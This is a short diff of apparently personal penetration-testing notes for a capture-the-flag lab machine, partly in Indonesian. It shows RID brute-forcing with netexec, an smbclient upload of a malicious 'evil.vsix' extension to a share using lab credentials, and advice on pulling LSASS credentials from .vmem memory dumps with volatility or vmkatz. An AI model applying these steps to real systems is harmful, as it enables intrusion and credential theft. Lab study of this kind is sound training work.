@@ -50,3 +50,8 @@ nxc smb 10.129.245.130 -u 'wallace.everette' -p 'Welcome2026@' --rid-brute | tee
 ```shell
 smbclient //10.129.28.66/DevDrop -U 'checkpoint.htb/Mark.Davies%Checkpoint2024!' -c "put evil.vsix evil.vsix"
 ```
+
+# Shares
+## 1. VMBackups
+- Cek `.vmem` 
+  karena itu RAM dump — tempat LSASS hidup dan menyimpan credential. Gunakan `vol` (Kalau filenya kecil) untuk di luar shell windows atau gunakan `vmkatz` (jika file terlalu besar untuk di download) untuk di dalam shell
